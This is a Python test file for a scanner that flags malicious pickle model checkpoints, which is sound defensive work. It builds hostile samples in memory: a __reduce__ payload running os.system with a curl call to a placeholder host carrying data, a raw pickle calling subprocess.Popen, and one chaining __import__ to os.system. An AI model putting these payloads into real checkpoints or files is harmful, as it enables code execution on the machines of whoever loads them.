"""The detector must fire on a real malicious pickle and stay quiet on a benign one.

Both samples are built in-memory. Nothing is ever unpickled.
"""
import pickle

from weightsentry import rce

BENIGN = pickle.dumps({"layer.weight": [1.0, 2.0, 3.0], "step": 7, "name": "adapter"})

# __reduce__ is how a malicious checkpoint asks pickle to call a callable at load.
class _Evil:
    def __reduce__(self):
        import os
        return (os.system, ("curl -s http://example.invalid/p?d=x",))

EVIL = pickle.dumps(_Evil())
EVIL_POPENS = (b"csubprocess\nPopen\n(S'id'\ntR.")

# A pickle that hides the callable behind STACK_GLOBAL (computed name).
STACKGLOBAL = (b"cbuiltins\n__import__\n(S'os'\ntR"
               b"(S'system'\ntR(S'id'\ntR.")


def test_benign_is_clean():
    v = rce.scan_pickle_bytes(BENIGN, "benign")
    assert v.ok, v.error
    assert v.verdict == "clean", v.suspicious


def test_reduce_os_system_is_dangerous():
    v = rce.scan_pickle_bytes(EVIL, "evil")
    assert v.verdict == "dangerous", v.as_dict()
    assert any("system" in s for s in v.suspicious)


def test_popen_is_dangerous():
    v = rce.scan_pickle_bytes(EVIL_POPENS, "popen")
    assert v.verdict == "dangerous", v.as_dict()


def test_stack_global_flagged():
    v = rce.scan_pickle_bytes(STACKGLOBAL, "sg")
    assert v.verdict in ("review", "dangerous"), v.as_dict()


def test_truncated_is_review_not_crash():
    v = rce.scan_pickle_bytes(EVIL[:20], "truncated")
    assert v.verdict in ("review", "dangerous")
